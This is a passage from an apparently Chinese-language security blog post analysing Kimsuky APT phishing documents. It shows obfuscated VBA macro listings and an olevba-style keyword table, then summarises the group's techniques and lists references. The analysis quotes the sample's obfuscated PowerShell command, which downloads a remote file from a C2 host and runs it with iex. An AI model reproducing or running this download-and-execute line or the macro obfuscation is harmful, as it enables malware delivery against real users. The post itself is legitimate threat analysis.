class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;o&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> idifdsakjflakds()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;p&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> dsiafqdksajf()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;q&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qeuejsahfdas()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;r&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> werjksjlakfja()</span><br><span class="line">  Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;t&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> yuehjdhaksda()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;u&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qieuirajksdjfkaa()</span><br><span class="line">  Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;v&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> yeujashdfjaakw()</span><br><span class="line">  Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;w&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qiwejkasjdfasfe()</span><br><span class="line">  Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;y&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> tejhjsahkfhka()</span><br><span class="line">  Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;z&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> vbsnjdfsdafdea()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;h&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> bvnmsnsdsaef()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;x&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> bndkslafkejalk()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;g&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> mxnjdsjkajfkea()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qkdnasnjekusk()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> vbjaskheuajks()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> mnsjkasjkeaskjei()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> xdjfkdjiealjfe()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;5&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> bnmcnakfdeal()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;6&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> mzsasfeisakf()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;7&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> xcvjfeuhaskf()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;8&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eyudfjashfkwe()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;9&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eyuresahfshfae()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;0&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qjiejwfksjalksainuse()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;-&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> idifdsakjflakdslus()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;=&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> euirieafkjekjf()</span><br><span class="line">   Selection.TypeBackspace</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qijdkasjlfkjaskBracket()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;[&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qeuejsahfdasBracket()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;]&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qewuidsakfjkdf()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;B&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eyruqjkajsfklef()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;D&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qeirodjkfklejka()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;E&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> ieriqdkalefijlak()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;F&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> bndkslafkejalkG()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;G&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> vbsnjdfsdafdeaH()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;H&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> jsdkfjaskaskfasI()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;I&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eijfkdsalkfjaksfjJ()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;J&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> ewiasdkfjaskjfK()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;K&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qijdkasjlfkjaskL()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;L&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qjiejwfksjalksaM()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;M&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> oqdsjakfjksajfaN()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;N&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> idifdsakjflakdsP()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;P&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> dsiafqdksajfQ()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;Q&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qeuejsahfdasR()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;R&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> vbjdhfjashueka()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;S&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> werjksjlakfjaT()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;T&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> yuehjdhaksdaU()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;U&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qieuirajksdjfkaaV()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;V&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> yeujashdfjaakwW()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;W&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> bvnmsnsdsaefX()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;X&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qiwejkasjdfasfeY()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;Y&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> tejhjsahkfhkaZ()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;Z&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qetdhfkdnkfan()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;A&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qojiewjfksajfO()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;O&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> efhjdhajjfkejf()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;\&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> dsiafqdksajfuato()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> werjksjlakfjaaum()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> vbdhfuelaejdkfla()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> bdkskaleidfjkdal()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> euirieafkjekjflash()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;/&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> xcvjdhfjdkfskael()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;@&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> vbdfasfjkeijkdsal()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> vbmssnxnjdska()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;$&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> zxcdjifjdkfaslfdsaf()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;%&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eyuehdjshfjhad()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;^&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> cbvcjkdsfsfeal()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;&amp;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> vbkjdfseeuusakl()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;*&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eyureuqhjfhak()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;(&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eujdhszfkjheuka()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> euehfhafjhdjkafqka()</span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;_&quot;</span></span><br><span class="line">    Application.Run MacroName:=<span class="string">&quot;Project.NewMacros.euirieafkjekjf&quot;</span></span><br><span class="line">    Application.Run MacroName:=<span class="string">&quot;Project.NewMacros.qjiejwfksjalksainuse&quot;</span></span><br><span class="line">    Application.Run MacroName:=<span class="string">&quot;Project.NewMacros.euirieafkjekjf&quot;</span></span><br><span class="line">    Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;_&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eijfkdjqjdfklafea()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;+&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> efuehjsahfklkejklafe()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;&#123;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> vbnmndmnsfajhfeaef()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> nmndsfjfekafeka()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;|&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> bvjdfjdhefkafskefa()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> bdnfasekdifjljqjfks()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eijfklsfnvkdaflfkejfa()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;&lt;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> xcnmnvdfefkakfl()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;&gt;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eoiqwerdjkfajfwe()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;?&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eioqieridsakfje()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;s&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eioqieridsakfje1()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;!&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> uyeufhejqkefj()</span><br><span class="line">   Selection.TypeText <span class="keyword">Text</span>:=<span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> dfekljsahdfjaea()</span><br><span class="line">   Selection.Delete Unit:=wdCharacter, Count:=<span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> vbsnjdfsdafdeaome()</span><br><span class="line">   Selection.HomeKey Unit:=wdLine</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> yuefiuhewjkhfas()</span><br><span class="line">   Selection.EndKey Unit:=wdLine</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> idifdsakjflakdsageup()</span><br><span class="line">   Selection.MoveUp Unit:=wdScreen, Count:=<span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> yuehjdhaksdap()</span><br><span class="line">   Selection.MoveUp Unit:=wdLine, Count:=<span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> eruwqfjksafqe()</span><br><span class="line">   Selection.MoveDown Unit:=wdLine, Count:=<span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qijdkasjlfkjaskeft()</span><br><span class="line">   Selection.MoveLeft Unit:=wdCharacter, Count:=<span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> qeuejsahfdasight()</span><br><span class="line">   Selection.MoveRight Unit:=wdCharacter, Count:=<span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> idifdsakjflakdsagedown()</span><br><span class="line">   Selection.MoveDown Unit:=wdScreen, Count:=<span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+----------+--------------------+---------------------------------------------+</span><br><span class="line">|Type      |Keyword             |Description                                  |</span><br><span class="line">+----------+--------------------+---------------------------------------------+</span><br><span class="line">|AutoExec  |Document_Open       |Runs <span class="keyword">when</span> the Word <span class="built_in">or</span> Publisher document <span class="built_in">is</span>  |</span><br><span class="line">|          |                    |opened                                       |</span><br><span class="line">|Suspicious|open                |May open a file                              |</span><br><span class="line">|Suspicious|Shell               |May run an executable file <span class="built_in">or</span> a system       |</span><br><span class="line">|          |                    |command                                      |</span><br><span class="line">|Suspicious|Run                 |May run an executable file <span class="built_in">or</span> a system       |</span><br><span class="line">|          |                    |command                                      |</span><br><span class="line">|Suspicious|ShellExecute        |May run an executable file <span class="built_in">or</span> a system       |</span><br><span class="line">|          |                    |command                                      |</span><br><span class="line">|Suspicious|CreateObject        |May create an OLE <span class="type">object</span>                     |</span><br><span class="line">|Suspicious|Shell.Application   |May run an application (<span class="keyword">if</span> combined <span class="keyword">with</span>     |</span><br><span class="line">|          |                    |CreateObject)                                |</span><br><span class="line">+----------+--------------------+---------------------------------------------+</span><br></pre></td></tr></table></figure><p>发现前部分代码创建shell之后出现一些比较奇怪的代码，推测可能进行过加密，网上一搜发现<a href="https://asec.ahnlab.com/en/25523/">APT攻击尝试使用针对特定个人的Word文档 - ASEC博客 (ahnlab.com)</a>这是Kimsuky组织进行代码混淆的手段，隐藏的代码是进行远程连接的代码，火绒剑动作检测发现样本调用了powershell进行了远程连接操作然后下载网站内的特定文件<a href="http://uekaf.myartsonline[.]com/ha/nn.txt，连接命令：">http://uekaf.myartsonline[.]com/ha/nn.txt，连接命令：</a></p><p>cmdline:’”C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe” [string]$f&#x3D;{(Nwraew-Objwraect Newrat.WebwraCliwraewrant).Doweilsdjfeng(‘<a href="http://uekaf.myartsonline[.]com/ha/nn.txt&#39;)};$j=$f.Replace(&#39;wra&#39;,&#39;&#39;);$u=$j.Replace(&#39;eilsdjfe&#39;,&#39;nloadstri&#39;);$x=iex">http://uekaf.myartsonline[.]com/ha/nn.txt&#39;)};$j=$f.Replace(&#39;wra&#39;,&#39;&#39;);$u=$j.Replace(&#39;eilsdjfe&#39;,&#39;nloadstri&#39;);$x=iex</a> $u;iex $x’</p><p><img src="https://s2.loli.net/2022/10/19/MXHe1zBjfT25WvN.png" alt="image-20221018191200571.png"></p><p>访问这个地址发现403。emmmm。。。。。</p><h3 id="样本行为-1"><a href="#样本行为-1" class="headerlink" title="样本行为"></a>样本行为</h3><p>1.样本伪造成韩国的表格同时代码隐藏在宏里</p><p>2.宏代码使用了特定的手段隐藏了C2地址以阻碍分析，并且远程连接C2下载文件<a href="http://uekaf.myartsonline[.]com/ha/nn.txt">http://uekaf.myartsonline[.]com/ha/nn.txt</a></p><h3 id="IOCs-2"><a href="#IOCs-2" class="headerlink" title="IOCs"></a>IOCs</h3><p><img src="https://s2.loli.net/2022/10/19/FY3fT1hxrVeGs2z.png" alt="image-20221018192025416.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文主要对朝鲜APT组织KimSuky的三个典型的样本进行了分析，发现该组织通常使用社会工程学内容发送钓鱼邮件将样本伪造成受害者组织或地区的官方文档、表格、调查报告，非常具有迷惑性。同时该组织使用宏代码载入word文档中，使用powershell或cmd实现基本的受害者主机的信息收集和远程C2的连接，下载攻击载荷对受害者计算机实行具体的攻击，包括但不限于修改注册表项、上传受害者的计算机基本信息、文件的创建与修改。此外，在攻击者进行编写宏代码的时候使用了代码混淆技术隐藏了C2地址。</p><p>关于近期KimSuky组织的攻击手段，发现该组织开始使用多段C2控制技术、（也就是分成不同的阶段多次连接服务器下载攻击载荷）<a href="https://mp.weixin.qq.com/s?__biz=MzkyMTI0NjA3OA==&mid=2247489545&idx=1&sn=c1d239b02bd5e4971bd63a3df1c3b328&chksm=c187d818f6f0510e055e8fb6fc963f6a28517246d3fab5f71bc69fb13208b050881650088a87&mpshare=1&scene=1&srcid=1008OFw1v0yqklXYUr5zq0ka&sharer_sharetime=1665194658526&sharer_shareid=af003b3f2008edcfbcc423963930a476#rd">攻击技术研判 | Kimsuky基于受害者身份验证的多阶段C2控制技术分析 (qq.com)</a>使用PebbleDash木马、双扩展名VBS样本等手段对目标进行攻击。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.sec-in.com/article/67">原创干货 | 【恶意代码分析技巧】08-文档宏病毒-SecIN (sec-in.com)</a></p><p><a href="https://buaq.net/go-17265.html">恶意代码分析中一些常见的非PE样本分析 (buaq.net)</a></p><p><a href="https://www.52pojie.cn/thread-944487-1-1.html">脚本类恶意程序分析技巧汇总 - 『病毒分析区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p><a href="https://www.4hou.com/posts/Yq9Y">如何辨别恶意Office文件？ - 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651091807&idx=4&sn=5ffb99e40c185d513bdf622440f9ed47&chksm=bd1fe1d48a6868c22067f2007661c50b32430d85fe4695a60a29499566000453d3821dfec461&mpshare=1&scene=1&srcid=1008IQOAPA6igtrLyN9UhI2Z&sharer_sharetime=1665194699222&sharer_shareid=af003b3f2008edcfbcc423963930a476#rd">一次KimSuky攻击事件分析 (qq.com)</a></p><p><a href="https://www.freebuf.com/articles/network/243718.html">一次KimSuky攻击事件分析 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.anquanke.com/post/id/219593">KimSuky各类攻击手法浅析-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://ti.qianxin.com/blog/articles/coronavirus-analysis-of-global-outbreak-related-cyber-attacks/">奇安信威胁情报中心 (qianxin.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/1695066">疑似 KimsukyAPT 组织最新攻击活动样本分析 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://zoemurmure.github.io/posts/a-kimsukyapt-sample/">ZOEM’S BLOG | 一个 KimsukyAPT样本分析 (zoemurmure.github.io)</a></p><p><a href="https://www.freebuf.com/articles/system/248717.html">白头山的战士：Kimsuky最新攻击活动样本分析 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.cisa.gov/uscert/ncas/alerts/aa20-301a">朝鲜高级持续性威胁焦点：金苏基·|断续器 (cisa.gov)</a></p><p><a href="http://blog.nsfocus.net/apt-kimsuky/">东北亚活跃分子APT组织Kimsuky之事件篇 – 绿盟科技技术博客 (nsfocus.net)</a></p><p><a href="https://asec.ahnlab.com/en/38182/">针对与朝鲜相关的特定个人的恶意Word文件 - ASEC博客 (ahnlab.com)</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkyMTI0NjA3OA==&mid=2247489545&idx=1&sn=c1d239b02bd5e4971bd63a3df1c3b328&chksm=c187d818f6f0510e055e8fb6fc963f6a28517246d3fab5f71bc69fb13208b050881650088a87&mpshare=1&scene=1&srcid=1008OFw1v0yqklXYUr5zq0ka&sharer_sharetime=1665194658526&sharer_shareid=af003b3f2008edcfbcc423963930a476#rd">攻击技术研判 | Kimsuky基于受害者身份验证的多阶段C2控制技术分析 (qq.com)</a></p><h3 id="样本链接"><a href="#样本链接" class="headerlink" title="样本链接"></a>样本链接</h3><p>链接：<a 